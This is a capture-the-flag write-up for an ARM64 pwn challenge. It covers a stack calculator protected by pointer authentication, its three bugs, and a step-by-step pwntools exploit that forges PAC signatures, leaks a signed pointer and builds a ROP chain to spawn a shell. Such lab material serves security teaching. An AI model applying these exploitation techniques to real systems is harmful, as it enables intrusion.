# TeamItaly Preselection CTF 2024

## [pwn] Pointer-Authenticated Calculator (0 solves)

I built a super secure calculator program that uses state of the art hardware
security extensions such as ARMv8.3-A PAC. Wanna try it out? It's definitely
100% unexploitable, so don't waste your time on that. Use it to do some math
instead!

```sh
nc pac.challs.external.open.ecsc2024.it 38311
```

Author: Marco Bonelli <@mebeim>

### Description

The challenge consists of a static ARM64 ELF executable compiled statically. The
only real security feature employed by the binary is the use of the ARMv8.3-A
Pointer Authentication Code feature (PAC) used to sign and authenticate stack
frames. Other than that, the executable is not stripped (symbols are present),
not position independent and does not use classic stack canaries.

The provided Docker container runs the challenge binary under QEMU user
(`qemu-aarch64`), which is built ad-hoc with a small patch. This patch is only
supposed to increase the number of bits used for PAC signatures from 8 to 16,
and shouldn't introduce vulnerabilities in QEMU.

**Author's note**: unfortunately the patch also had the effect of completely
breaking the AUTIA/RETAA instructions for authenticating PAC signatures. I did
not catch this while testing, so the challenge had an easy unintended solution:
completely ignore PAC and solve as if it was not there :').

The challenge implements a stack-based calculator with only a handful of
available operations. Operations are represented by simple structures of th
form

```c
struct op {
    void (*func)(long *);
    long *stack;
};
```

Each operation has an associated function and operates on a given stack pointer.
For example, `op_add()` takes two values from the stack, adds them together, and
pushes the result:

```c
void op_add(long *const stack) {
    stack[0] = stack[1] + stack[0];
}
```

The function is invoked as `op->func(op->stack)`, and as can be seen above, it
does not modify `op->stack`, but merely uses it as a reference to the stack
slots where its operands should be found and where the result should be written.

The implemented operations are in a global table that describes their name, the
function to use, the number of arguments that the operation will pop, and the
number of results that the operation will push:

```c
const struct op_descr operations[7] = {
    { .name = "neg", .func = op_neg, .n_pop = 0, .n_push = 0 },
    { .name = "add", .func = op_add, .n_pop = 2, .n_push = 1 },
    { .name = "sub", .func = op_sub, .n_pop = 2, .n_push = 1 },
    { .name = "mul", .func = op_mul, .n_pop = 2, .n_push = 1 },
    { .name = "div", .func = op_div, .n_pop = 2, .n_push = 1 },
    { .name = "in" , .func = op_in , .n_pop = 0, .n_push = 1 },
    { .name = "out", .func = op_out, .n_pop = 1, .n_push = 0 },
};
```

After starting, the program provides a textual menu with a few options. Among
these, the most important ones are:

1. Building an expression
2. Validating an expression
3. Evaluating an expression

#### Building expressions

When building, a string of semicolon-separated (`;`) operation names is taken as
input, parsed and saved into one of 4 global save slots. The structure used to
save expressions is the following:

```c
struct expr {
    long stack[32];
    struct op ops[32];
    long valid;
    size_t n_ops;
};

// mmap'ed in main() with enough space for 4 struct expr
struct expr *saved_exprs;
```

Each encountered operation is parsed into a `struct op` where the `->func` field
is set to the appropriate function and the `->stack` field is set to the
appropriate slot. The first op's `->stack` is set to `&expr->stack[0]`, and each
operation the "popping" and "pushing" is emulated:

```c
void build(struct expr *expr, char *source) {
    long *stack;
    char *name;

    memset(expr->stack, 0, sizeof(expr->stack));
    expr->n_ops = 0;
    expr->valid = 0;

    stack = expr->stack;

    for (name = strtok(source, " ;"); name; name = strtok(NULL, " ;")) {
        struct op *op = &expr->ops[expr->n_ops];
        if (expr->n_ops >= EXPR_MAX_OPS)
            die("Expression too long!");

        // Find instruction name in global operations[] array
        for (size_t j = 0; j < sizeof(operations)/sizeof(*operations); j++) {
            const struct op_descr *descr = &operations[j];

            // If found, assign the operation and update the current stack position
            if (!strcmp(name, operations[j].name)) {
                op->func = descr->func;
                stack -= descr->n_pop;
                op->stack = stack;
                stack += descr->n_push;
                goto next;
            }
        }

        printf("Skipping unknown operation: \"%s\"\n", name);
    next:
        expr->n_ops++;
    }
}
```

As a result, after building, each operation will have a fixed `->stack` address
associated with it. This is the pre-computed expression stack pointer position
at the time the operation is encountered. For example, the expression
`in;in;add;out` will generate the following:

```c
expr = {
    .stack = {0},
    .ops = {
        { .func = op_in, .stack = &expr->stack[0] },
        // (in)  push 1 -> cur_stack = &expr->stack[1]
        { .func = op_in, .stack = &expr->stack[1] },
        // (in)  push 1 -> cur_stack = &expr->stack[2]
        // (add) pop 2 -> cur_stack = &expr->stack[0]
        { .func = op_add, .stack = &expr->stack[0] },
        // (add) push 1 -> cur_stack = &expr->stack[1]
        { .func = op_out, .stack = &expr->stack[1] },
    },
    .valid = 0,
    .n_ops = 4
};
```

### Validating expressions

Validation can either be triggered manually with command 2, or automatically
before evaluation with command 3. When validating an expression, the following
happens:

1. Each operation is signed with the [PACIA][aarch64-pacia] instruction
   (function `sign_op()`) using the function pointer (`op->func`) as pointer to
   sign and the expression stack pointer (`op->stack`) as modifier.
2. For each operation, the expression stack pointer (`op->stack`) is checked to
   be within bounds of `expr->stack` (which is only 32 slots). If any operation
   has a stack pointer that overflows or underflows `expr->stack`, validation
   fails.

If the checks described in point 2 pass, `expr->valid` is set to `1`. Now all
the `ops` from `expr->ops[0]` to `expr->ops[expr->n_ops - 1]` have PAC-signed
function pointers.

### Evaluating expressions

When evaluating an expression, `expr->ops` are evaluated in order performing
authentication using the [AUTIA][aarch64-autia] instruction (function
`auth_op()`) with pointer `op->func` and modifier `op->stack`. Only if
`op->func` and `op->stack` are the same as the ones signed during validation the
operation is then executed as `op->func(op->stack)`. Furthermore, an additional
check is performed to make sure that `op->func` is among the known ones in the
global `operations` array.

### Bugs

There are 3 different bugs in the program:

1. A trivial stack-based buffer overflow happens in the function `get_str()`,
   which always reads `0x200` bytes despite being passed a pointer to a buffer
   that can only hold at most `0x100` bytes.
2. Improper signing (`sign_op()`) of all the operations in the `validate()`
   function **before** making sure their expression stack is within bounds.
3. Evaluation in the `eval()` does not stop after `expr->n_ops` operations, but
   instead stops either after 32 operations (the maximum) or at the first
   operation having `op->func == NULL`.

The buffer overflow in `get_str()`, used to read an expression from standard
input when building, allows overwriting the saved return address of the `main()`
function. However, the saved return address is signed with the
[PACIASP][aarch64-pacia] instruction at the start of the function, and
authenticated with the special [RETAA][aarch64-retaa] instruction (similar to
AUTIASP + RET). In order to exploit the buffer overflow and redirect
control-flow it is therefore necessary to forge a PAC-signed pointer using the
address of `main()`'s stack frame as modifier, or the program will try returning
to an invalid address.

### Solution

Thanks to the improper stop condition on expression evaluation in the `eval()`
function, unwanted operations can be executed. Since previous operations in the
`expr->ops[]` array are not zeroed out when building, one can initially build a
long expression in one of the global save slots, then validate it, and then
build another shorter expression in the same save slot. When evaluating the
expression, after the operations of the second (short) expression are executed,
the operations of the previous (longer) expression will also be executed, using
their pre-calculated stack values.

Furthermore, since the validation done by the `validate()` function signs all
operations and *only then* checks for validity, it is possible to build an
initial invalid expression such as `out;out;out` that causes underflow on the
expression stack. Then, get its operation signed through `validate()`, and then
build a shorter expression on top of it such as `neg`, which will pass
validation and set `expr->valid = 1`. In such case, when evaluating the
expression in `eval()`, the operations that will be executed are `neg;out;out`.
Of those, the two `out` instructions will have a `op->stack` pointing outside of
(before) `expr->stack[]`.

Since expressions are saved in 4 global adjacent save slots, causing underflow
in one expression gives us the ability to alter the contents of the previous
`struct expr`. We can abuse this to forge arbitary PAC-signed pointers.

More precisely, we can do the following:

1. Build `saved_exprs[0]` using 32 operations (it does not matter which ones).
2. Build `saved_exprs[1]` using operations that go back 4 stack slots and then
   take 2 inputs: (`out;out;out;out;in;in`). This will make the `op->stack`
   for the last two `in` instructions point respectively to
   `&saved_exprs[0].ops[31].stack` and `&saved_exprs[0].ops[31].func`.
3. Validate `saved_exprs[1]`. Validation will fail, but all operations will be
   signed regardless.
4. Build `saved_exprs[1]` again replacing the `out` with a harmless operation
   that does not move the stack (or moves it within bounds), such as:
   `neg;neg;neg;neg`.
5. Evaluate `saved_exprs[1]`. This will only validate the four `neg` and mark
   the expression as valid, then execute everything
   *including the previous `in` operations*. Since the `op->stack` of those two
   `in` points back at the `->stack` and `->func` of `saved_exprs[0].ops[31]`,
   we can now overwrite those with arbitrary values, crafting an op with
   arbitrary `->func` and `->stack`.
6. Validate `saved_exprs[0]` to sign the crafted op.

This boils down to the following (using pwntools):

```python
ARBITARRY_FUNC_ADDRESS  = 0x123 # to figure out later...
ARBITRARY_STACK_ADDRESS = 0x456 # to figure out later...

r = remote(...)
# 1: build a 32-op expr in slot 0
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'in;' * 32)
r.sendlineafter(b'? ', b'0')
# 2: build bad expr 1 to underflow its stack into expr 0
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'out;out;out;out;in;in')
r.sendlineafter(b'? ', b'1')
# 3: validate it
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'? ', b'1')
# 4: re-build with good ops to pass validation
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'neg;neg;neg;neg')
r.sendlineafter(b'? ', b'1')
# 5: evaluate to execute "neg;neg;neg;neg;in;in" (the two "in" are left-over
#    from the first build)
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'? ', b'1')
r.sendlineafter(b'Input a number: ', ARBITARRY_FUNC_ADDRESS)
r.sendlineafter(b'Input a number: ', ARBITRARY_STACK_ADDRESS)
# 6: validate expr 0 to sign ARBITARRY_FUNC_ADDRESS + ARBITRARY_STACK_ADDRESS
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'? ', b'0')
```

Now we have the ability to sign an adbitrary pair of pointer + modifier using
the [AUTIA][aarch64-autia] instruction in `sign_op()`. We can use this to sign a
valid reuturn address for the `main()` function and use it to exploit the buffer
overflow on the buffer in `cmd_build()`.

The binary is static, and QEMU User 7.2.12 (the version we are given) does not
randomize the stack, so the `main()` function will always have the same stack
frame address. We can find it by attaching GDB to QEMU following the
instructions provided in the player's README file:

```none
gdb-multiarch --ex 'target remote :1234' -ex 'file pac'
(gdb) b *0x400e04
Breakpoint 1 at 0x400e04
(gdb) continue
Continuing.

Breakpoint 1, 0x0000000000400e04 in main ()
(gdb) x/i $pc
=> 0x400e04 <main>: paciasp
(gdb) i r sp
sp             0x5500800290        0x550080029
```

We also have the `system()` function already present in the binary since it is
used for command 5. The only thing we need is good a gadget to set the `x0`
register. Using [ROPGadget][ropgadget] (or similar tools) we can find this
gadget that does what we want:

```none
0x000000000045d860 : ldr x0, [sp, #0x90] ; ldp x29, x30, [sp], #0xc0 ; ret
```

We can now sign a fake `struct op` with `op->func = 0x45d860` and
`op->stack = 0x5500800290`:

```python
ARBITARRY_FUNC_ADDRESS  = 0x45d860
ARBITRARY_STACK_ADDRESS = 0x5500800290
# rest of the code above unchanged...
```

How do we read back the signed `op->func` pointer though? Well, it's more or
less the same thing that we just did: create an expression at index 1 that moves
the stack back until `&saved_exprs[0].ops[32].func`, validate it to sign the
ops, then overwrite it with a valid shorter expression, then execute it to
execute the old ops. This time we can use `out` instead of `in` to print the
value of the signed function pointer. Here's how it can be done:

```python
# Build expr 1 to output values going back until saved_exprs[0].ops[31].func.
# NOTE: the two "neg" at the end are to overwrite the two "in" we previously had.
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'out;out;out;out;neg;neg')
r.sendlineafter(b'? ', b'1')
# Vlidate it (will fail validation, but sign the ops)
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'? ', b'1')
# Re-build with good ops to pass validation
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'neg;neg;neg')
r.sendlineafter(b'? ', b'1')
# Evaluate it to output the forged signed pointer (saved_exprs[0].ops[31].func)
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'? ', b'1')
r.recvuntil(b'Output: ')
signed_ptr = int(r.recvline())
```

Now all that's left to do is create a simple ROP chain that uses the gadget we
found earlier and the `system()` function to get a shell. Since the binary is
static and contains `system()` it also certainly contains the string
`"/bin/sh"`.

```python
# Exploit buffer overflow in cmd_build() overwriting the main()'s saved x30
# with signed_ptr, then exit (cmd 6) to gain PC control.
exe = ELF('./pac', checksec=False)
bin_sh = next(exe.search(b'/bin/sh\0'))

chain = flat(signed_ptr, [0] * 5, exe.sym.system, [0] * 16, bin_sh)

# Build
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', chain)
r.sendlineafter(b'? ', b'2')

# Exit: return from main()
r.sendlineafter(b'> ', b'6')

# We should now have a shell
r.interactive()
```

### Complete exploit

See [`checker/__main__.py`](checker/__main__.py) for the final automated exploit
script.

[aarch64-pacia]: https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ
[aarch64-autia]: https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/AUTIA--AUTIZA--AUTIA1716--AUTIASP--AUTIAZ
[aarch64-retaa]: https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/RETAA--RETAB
[ropgadget]: https://github.com/JonathanSalwan/ROPgadget
